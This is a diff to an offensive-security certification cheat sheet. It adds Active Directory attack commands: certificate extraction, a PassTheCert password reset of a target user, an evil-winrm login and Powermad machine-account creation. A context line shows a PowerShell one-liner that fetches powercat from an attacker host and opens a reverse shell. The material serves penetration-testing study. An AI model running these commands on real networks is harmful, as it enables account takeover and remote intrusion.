@@ -116,9 +116,11 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [ldapsearch](https://github.com/0xsyr0/OSCP#ldapsearch)
 		- [Linux](https://github.com/0xsyr0/OSCP#linux-1)
 		- [Microsoft Windows](https://github.com/0xsyr0/OSCP#microsoft-windows-1)
+                - [PassTheCert](https://github.com/0xsyr0/OSCP#passthecert)
 		- [PKINITtools](https://github.com/0xsyr0/OSCP#pkinittools)
 		- [Port Scanning](https://github.com/0xsyr0/OSCP#port-scanning)
 		- [powercat](https://github.com/0xsyr0/OSCP#powercat)
+                - [Powermad](https://github.com/0xsyr0/OSCP#powermad)
 		- [PowerShell](https://github.com/0xsyr0/OSCP#powershell)
 		- [pwncat](https://github.com/0xsyr0/OSCP#pwncat)
 		- [rpcclient](https://github.com/0xsyr0/OSCP#rpcclient)
@@ -3795,6 +3797,19 @@ wmic product get name,version,vendor
 wmic qfe get Caption,Description,HotFixID,InstalledOn    # no new patches - KEXP pretty likely
 ```
 
+#### PassTheCert
+
+> https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html
+
+> https://github.com/AlmondOffSec/PassTheCert/tree/main/Python
+
+```c
+certipy-ad cert -pfx <CERTIFICATE>.pfx -nokey -out <CERTIFICATE>.crt
+certipy-ad cert -pfx <CERTIFICATE>.pfx -nocert -out <CERTIFICATE>.key
+python3 passthecert.py -domain '<DOMAIN>' -dc-host '<DOMAIN>' -action 'modify_user' -target '<USERNAME>' -new-pass '<PASSWORD>' -crt ./<CERTIFICATE>.crt -key ./<CERTIFICATE>.key
+evil-winrm -i '<RHOST>' -u '<USERNAME>' -p '<PASSWORD>'
+```
+
 #### PKINITtools
 
 ```c
@@ -3813,6 +3828,14 @@ $ export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/
 
 ```c
 powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e cmd"
+```
+
+#### Powermad
+
+```c
+Import-Module ./Powermad.ps1
+$secureString = convertto-securestring "<PASSWORD>" -asplaintext -force
+New-MachineAccount -MachineAccount <NAME> -Domain <DOMAIN> -DomainController <DOMAIN> -Password $secureString
 ```
 
 #### PowerShell
